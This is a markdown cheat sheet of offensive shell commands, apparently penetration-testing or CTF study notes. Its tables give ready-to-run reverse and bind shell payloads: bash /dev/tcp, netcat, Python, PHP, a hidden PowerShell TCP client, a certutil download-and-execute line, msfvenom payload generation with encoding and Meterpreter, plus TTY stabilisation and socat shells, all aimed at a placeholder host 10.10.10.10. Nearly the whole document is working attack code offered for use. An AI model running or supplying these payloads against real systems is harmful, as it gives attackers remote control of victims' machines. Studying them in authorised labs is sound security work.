# Shells Overview - Commands

## Netcat Listeners

| Command | Description |
|---------|-------------|
| `nc -lvnp 4444` | Basic netcat listener on port 4444 |
| `nc -lvnp 4444 -e /bin/bash` | Bind shell (netcat with shell execution) |
| `rlwrap nc -lvnp 4444` | Listener with readline wrapper (arrow keys, tab completion) |
| `nc -lvnp 4444 > received_shell.txt` | Log all shell output to a file |

## Reverse Shell Payloads (Linux)

| Command | Description |
|---------|-------------|
| `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` | Bash reverse shell (one-liner) |
| `nc -e /bin/sh 10.10.10.10 4444` | Netcat reverse shell (if -e flag supported) |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 4444 >/tmp/f` | Netcat FIFO reverse shell (no -e) |
| `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` | Python reverse shell |
| `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` | PHP reverse shell |

## Reverse Shell Payloads (Windows)

| Command | Description |
|---------|-------------|
| `powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 \| Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` | PowerShell reverse shell |
| `certutil -urlcache -f http://10.10.10.10/payload.exe payload.exe && payload.exe` | Download and execute reverse shell |

## msfvenom Payload Generation

| Command | Description |
|---------|-------------|
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf` | Linux x64 stageless reverse shell |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe` | Windows stageless reverse shell |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf -a x64` | Specify architecture explicitly |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf -e x64/zutto_dekiru` | Encoded payload |
| `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o met.elf` | Meterpreter reverse shell |

## Shell Stabilisation Techniques

| Command | Description |
|---------|-------------|
| `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Spawn TTY shell with Python |
| `python -c 'import pty;pty.spawn("/bin/bash")'` | Spawn TTY shell with Python 2 |
| `script -qc /bin/bash /dev/null` | Spawn TTY shell with script command |
| `socat exec:'bash -li',pty,stderr,setsid,sigint,sane UNIX-CONNECT:/tmp/shell` | Upgrade with socat (on target) |
| `stty raw -echo; fg` | Background shell and foreground with proper terminal |

## Socat Shells

| Command | Description |
|---------|-------------|
| `socat TCP-L:4444 EXEC:/bin/bash` | Socat bind shell listener |
| `socat TCP:10.10.10.10:4444 EXEC:/bin/bash` | Socat reverse shell |
| `socat TCP-L:4444 FILE:`tty`,raw,echo=0` | Socat TTY listener (attacker) |
| `socat TCP:10.10.10.10:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane` | Socat fully interactive reverse shell |
